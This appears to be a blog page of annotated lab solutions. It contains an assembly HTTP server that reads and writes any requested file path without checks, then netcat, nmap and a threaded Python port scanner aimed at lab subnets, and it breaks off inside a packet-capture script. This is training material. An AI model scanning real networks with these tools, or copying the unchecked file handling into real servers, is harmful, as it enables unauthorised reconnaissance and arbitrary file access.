<h3 id="1-10-and-1-11-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-POST-GETrequests"><a href="#1-10-and-1-11-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-POST-GETrequests" class="headerlink" title="1.10 and 1.11 Multi-processed program that dynamically responds to multiple HTTP POST GETrequests"></a>1.10 and 1.11 Multi-processed program that dynamically responds to multiple HTTP POST GETrequests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # Open socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    # Store socket fd in rbx</span><br><span class="line">    mov rbx, rax</span><br><span class="line"></span><br><span class="line">    # Bind socket to address</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    lea rsi, sa_family_t</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Listen on socket</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    accept_jump:</span><br><span class="line">    # Accept a connection</span><br><span class="line">    mov rdi, rbx	# 接受的是open socket 返回的文件描述符，accept在打开的socket上监听链接，接受后返回对应客户端的文件描述符</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    # Save new fd for bound connection in r12</span><br><span class="line">    mov r12, rax	# 对应客户端的文件描述符</span><br><span class="line"></span><br><span class="line">    # Fork the process and let the child do the serving</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line">    cmp rax, 0	# 当 fork 返回 0 时表示其为子进程</span><br><span class="line">    je serve_connection</span><br><span class="line">    # Close the connection if parent 父进程关闭客户端的文件描述符，交给子进程与客户端交互</span><br><span class="line">    mov rdi, r12</span><br><span class="line">    mov rax, 3		# syscall:close</span><br><span class="line">    syscall</span><br><span class="line">    # Then go back to listening # 继续监听</span><br><span class="line">    jmp accept_jump</span><br><span class="line"></span><br><span class="line">    serve_connection:</span><br><span class="line">    # Close listening socket 子进程不再监听客户端连接</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Read from the connection </span><br><span class="line">    mov rdi, r12</span><br><span class="line">    lea rsi, read_buffer	# read_buffer 在 .data 中声明的read_buffer，这里直接保存在对应地址中了</span><br><span class="line">    mov rdx, [read_packet_length] # 长度</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Figure out what file was requested</span><br><span class="line">    # 返回 file_path的第一个字符的地址</span><br><span class="line">    lea rdi, read_buffer # 第一个参数：将 read_buffer 标签对应的内存地址加载到对应的寄存器中</span><br><span class="line">    mov rsi, 1  # 第二个参数：1</span><br><span class="line">    lea rdx, space # 第三个参数：space的地址</span><br><span class="line">    call get_nth_substr # 返回第 n 次出现的子字符串的最后一个字符的地址</span><br><span class="line">    mov r13, rax # 保存文件地址</span><br><span class="line">    lea rdi, read_buffer</span><br><span class="line">    mov rsi, 2</span><br><span class="line">    call get_nth_substr</span><br><span class="line">    mov r14, rax # </span><br><span class="line">    sub r14, 1 # r14 文件名的最后一个地址</span><br><span class="line">    # r13 = start (exclusive), r14 = end (inclusive)</span><br><span class="line">    mov rdi, r13 # 文件名开始地址 </span><br><span class="line">    mov rsi, r14 # 文件名结束地址</span><br><span class="line">    lea rdx, file_name_buffer # 文件名将要保存到的地址</span><br><span class="line">    call write_to_buf</span><br><span class="line">    # Filename is now stored in file_name_buffer</span><br><span class="line"></span><br><span class="line">    # Check request type </span><br><span class="line">    mov dil, [read_buffer] # read_buffer 的第一个字符判断操作类型</span><br><span class="line">    # Compare to &quot;G&quot;</span><br><span class="line">    cmp dil, 0x47</span><br><span class="line">    # Continue (GET process) if G, otherwise do POST</span><br><span class="line">    jne POST</span><br><span class="line"></span><br><span class="line">    GET:</span><br><span class="line">        # Open that file</span><br><span class="line">        lea rdi, file_name_buffer</span><br><span class="line">        mov rsi, 0</span><br><span class="line">        mov rdx, 0</span><br><span class="line">        mov rax, 2</span><br><span class="line">        syscall</span><br><span class="line">        mov r13, rax # file 的文件描述符</span><br><span class="line"></span><br><span class="line">        # Read file contents</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        lea rsi, file_read_buffer # file content 保存的地方</span><br><span class="line">        mov rdx, 1024</span><br><span class="line">        mov rax, 0</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Close the file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 3</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write status to connection 向客户端socket发送HTTP状态</span><br><span class="line">        mov rdi, r12 </span><br><span class="line">        lea rsi, write_static # &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">        mov rdx, 19</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write file contents to connection</span><br><span class="line">        lea rdi, file_read_buffer</span><br><span class="line">        call get_len</span><br><span class="line">        mov rdx, rax</span><br><span class="line">        sub rdx, 1</span><br><span class="line">        mov rdi, r12</span><br><span class="line">        lea rsi, file_read_buffer</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        jmp exit</span><br><span class="line"></span><br><span class="line">    POST:</span><br><span class="line">        # Open that file</span><br><span class="line">        lea rdi, file_name_buffer</span><br><span class="line">        mov rsi, 0x41 # O_CREAT, O_WRONLY</span><br><span class="line">        mov rdx, 0777</span><br><span class="line">        mov rax, 2</span><br><span class="line">        syscall</span><br><span class="line">        mov r13, rax</span><br><span class="line"></span><br><span class="line">        # Get the POST content</span><br><span class="line">        lea rdi, read_buffer</span><br><span class="line">        mov rsi, 1</span><br><span class="line">        lea rdx, double_cr_lf</span><br><span class="line">        call get_nth_substr</span><br><span class="line">        mov rsi, rax</span><br><span class="line">        add rsi, 1</span><br><span class="line"></span><br><span class="line">        # Get write length</span><br><span class="line">        mov rdi, rsi</span><br><span class="line">        call get_len</span><br><span class="line">        mov rdx, rax</span><br><span class="line">        # Get rid of the pesky null byte</span><br><span class="line">        sub rdx, 1</span><br><span class="line">        # Write to file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Close the file</span><br><span class="line">        mov rdi, r13</span><br><span class="line">        mov rax, 3</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">        # Write status to connection</span><br><span class="line">        mov rdi, r12</span><br><span class="line">        lea rsi, write_static</span><br><span class="line">        mov rdx, 19</span><br><span class="line">        mov rax, 1</span><br><span class="line">        syscall</span><br><span class="line"></span><br><span class="line">    exit:</span><br><span class="line">    # Close the connection</span><br><span class="line">    mov rdi, r12</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Sys exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # Get the length of a null-terminated string (including the first null byte)</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - buffer we&#x27;re checking the length of</span><br><span class="line">    # rax - length</span><br><span class="line">    get_len:</span><br><span class="line">        mov rax, 0</span><br><span class="line">        get_len_loop:</span><br><span class="line">            # See if rdi + rax-th byte is null</span><br><span class="line">            mov r10, rdi</span><br><span class="line">            add r10, rax</span><br><span class="line">            mov r10, [r10]</span><br><span class="line">            add rax, 1</span><br><span class="line">            cmp r10, 0x00</span><br><span class="line">            jne get_len_loop</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    # Copy the bytes spanning rdi to rsi to the buffer rdx</span><br><span class="line">    # rdx MUST BE LONGER THAN rsi - rdi BYTES, rdi MUST BE LESS THAN rsi</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - start (exclusive) of the string we&#x27;re copying</span><br><span class="line">    # rsi - end (inclusive) of the string we&#x27;re copying</span><br><span class="line">    # rdx - buffer we&#x27;re copying to</span><br><span class="line">    # rax - unchanged</span><br><span class="line">    write_to_buf:</span><br><span class="line">        write_to_buf_loop:</span><br><span class="line">            add rdi, 1</span><br><span class="line">            mov r9, [rdi]</span><br><span class="line">            mov [rdx], r9</span><br><span class="line">            add rdx, 1</span><br><span class="line">            cmp rdi, rsi</span><br><span class="line">            jne write_to_buf_loop</span><br><span class="line">        mov byte ptr [rdx], 0x00</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">    # Get address of the (last byte of) the nth occurence of substring in string (occurences must be non-overlapping)</span><br><span class="line">    # ONLY GUARANTEED TO WORK ON NULL-TERMINATED STRINGS</span><br><span class="line">    # Args:</span><br><span class="line">    # rdi - target string address</span><br><span class="line">    # rsi - n</span><br><span class="line">    # rdx - substring</span><br><span class="line"></span><br><span class="line">    # rax - address of nth character</span><br><span class="line">    get_nth_substr:</span><br><span class="line">        # Set rcx (ocurrence counter)</span><br><span class="line">        mov rcx, 0</span><br><span class="line">        # Set r10 (to traverse substring)</span><br><span class="line">        mov r10, rdx</span><br><span class="line">        check_character_loop:</span><br><span class="line">            # r9b = character at position</span><br><span class="line">            mov r9b, [rdi]</span><br><span class="line">            # If string&#x27;s terminated, obviously the substring doesn&#x27;t occur enough times</span><br><span class="line">            cmp r9b, 0x00</span><br><span class="line">            je not_enough_occurrences</span><br><span class="line">            # Step through substring iff r9b = current byte</span><br><span class="line">            cmp r9b, byte ptr [r10]</span><br><span class="line">            jne character_not_equal</span><br><span class="line">                add r10, 1</span><br><span class="line">                # If we&#x27;ve reached the end of the substring, increment counter and reset r10</span><br><span class="line">                cmp byte ptr [r10], 0x00</span><br><span class="line">                jne after_comparison</span><br><span class="line">                    mov r10, rdx</span><br><span class="line">                    add rcx, 1</span><br><span class="line">                    jmp after_comparison</span><br><span class="line">            character_not_equal:</span><br><span class="line">                # Reset r10 without adding to count</span><br><span class="line">                mov r10, rdx</span><br><span class="line">            after_comparison:</span><br><span class="line">            # Return address if we&#x27;ve got the nth ocurrence</span><br><span class="line">            cmp rcx, rsi</span><br><span class="line">            je match</span><br><span class="line">            # Otherwise increment and continue</span><br><span class="line">            add rdi, 1</span><br><span class="line">            jmp check_character_loop</span><br><span class="line">        match:</span><br><span class="line">        mov rax, rdi</span><br><span class="line">        ret</span><br><span class="line">        not_enough_occurrences:</span><br><span class="line">        mov rax, -1</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    # sockaddr_in struct</span><br><span class="line">    sa_family_t: .word 2</span><br><span class="line">    bind_port: .word 0x5000</span><br><span class="line">    bind_address: .double 0x00000000</span><br><span class="line">    pad: .byte 0,0,0,0,0,0,0,0</span><br><span class="line">    # Make empty buffers to read to</span><br><span class="line">    read_buffer: .space 1024</span><br><span class="line">    file_name_buffer: .space 1024</span><br><span class="line">    file_read_buffer: .space 1024</span><br><span class="line">    # Constants</span><br><span class="line">    # Yes it&#x27;s dumb to use a quad word for this, but it simplifies copying it to the register</span><br><span class="line">    read_packet_length: .quad 0x0000000000000400</span><br><span class="line">    write_static: .string &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    space: .string &quot; &quot;</span><br><span class="line">    double_cr_lf: .string &quot;\r\n\r\n&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h2 id="2-Intercepting-Communication"><a href="#2-Intercepting-Communication" class="headerlink" title="2. Intercepting Communication"></a>2. Intercepting Communication</h2><h3 id="2-1-Connect-to-a-remote-host"><a href="#2-1-Connect-to-a-remote-host" class="headerlink" title="2.1 Connect to a remote host"></a>2.1 Connect to a remote host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.0.3 31337</span><br></pre></td></tr></table></figure>



<h3 id="2-2-Listen-for-a-connection-from-a-remote-host"><a href="#2-2-Listen-for-a-connection-from-a-remote-host" class="headerlink" title="2.2 Listen for a connection from a remote host"></a>2.2 Listen for a connection from a remote host</h3><p><code>-l</code>表示<code>Netcat</code>进入监听状态、<code>-p</code>指定监听的端口号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 31337</span><br></pre></td></tr></table></figure>

<h3 id="2-3-Find-and-connect-to-a-remote-host"><a href="#2-3-Find-and-connect-to-a-remote-host" class="headerlink" title="2.3 Find and connect to a remote host"></a>2.3 Find and connect to a remote host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 31337 10.0.0.0/24 <span class="comment"># 使用nmap 扫描对应子网上开放31337端口的IP地址</span></span><br><span class="line">nc 10.0.0.63 31337 <span class="comment"># 建立链接</span></span><br></pre></td></tr></table></figure>

<h3 id="2-4-Find-and-connect-to-a-remote-host-on-a-large-network"><a href="#2-4-Find-and-connect-to-a-remote-host-on-a-large-network" class="headerlink" title="2.4 Find and connect to a remote host on a large network"></a>2.4 Find and connect to a remote host on a large network</h3><p>由于要寻找的子网数量庞大，使用python的多线程技术进行查找</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.0.0/16 子网的起始 IP 和结束 IP</span></span><br><span class="line">start_ip = <span class="string">&#x27;10.0.0.0&#x27;</span></span><br><span class="line">end_ip = <span class="string">&#x27;10.0.255.255&#x27;</span></span><br><span class="line">port = <span class="number">31337</span></span><br><span class="line">num_threads = <span class="number">100</span>  <span class="comment"># 线程数</span></span><br><span class="line">output_file = <span class="string">&#x27;found_hosts.txt&#x27;</span>  <span class="comment"># 输出文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 IP 地址转换为整数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip_to_int</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(x)) <span class="keyword">for</span> x <span class="keyword">in</span> ip.split(<span class="string">&#x27;.&#x27;</span>)]), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将整数转换为 IP 地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_ip</span>(<span class="params">ip_int</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span>.join([<span class="built_in">str</span>(ip_int &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)[::-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描指定 IP 地址的指定端口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;checking <span class="subst">&#123;ip&#125;</span>&quot;</span>)</span><br><span class="line">        s.settimeout(<span class="number">0.5</span>)</span><br><span class="line">        result = s.connect_ex((ip, port))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Found host: <span class="subst">&#123;ip&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&#x27;<span class="subst">&#123;ip&#125;</span>\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> ip</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取起始和结束 IP 的整数值</span></span><br><span class="line">start_int = ip_to_int(start_ip)</span><br><span class="line">end_int = ip_to_int(end_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程池并行扫描</span></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=num_threads) <span class="keyword">as</span> executor:</span><br><span class="line">    future_to_ip = &#123;executor.submit(scan_ip, int_to_ip(ip_int)): int_to_ip(ip_int) <span class="keyword">for</span> ip_int <span class="keyword">in</span> <span class="built_in">range</span>(start_int, end_int + <span class="number">1</span>)&#125;</span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(future_to_ip):</span><br><span class="line">        ip = future_to_ip[future]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = future.result()</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Successfully connected to <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ip&#125;</span> generated an exception: <span class="subst">&#123;exc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-5-Monitor-traffic-from-a-remote-host"><a href="#2-5-Monitor-traffic-from-a-remote-host" class="headerlink" title="2.5 Monitor traffic from a remote host"></a>2.5 Monitor traffic from a remote host</h3><blockquote>
<p>IPV4头格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0                   1                   2                   3</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>


</blockquote>
<p>在端口上捕获TCP数据包</p>
<ul>
<li><p><code>!BBHHHBBH4s4s</code> 是用于解析二进制数据的格式字符串，它是 Python 的 <code>struct</code> 模块的一部分。</p>
<ul>
<li><p><code>!</code>：表示使用网络字节顺序（大端序）。</p>
</li>
<li><p><code>B</code>：表示一个无符号的 8 位整数（1 字节）。</p>
</li>
<li><p><code>H</code>：表示一个无符号的 16 位整数（2 字节）。</p>
</li>
<li><p><code>4s</code>：表示一个长度为 4 的字节串。</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span 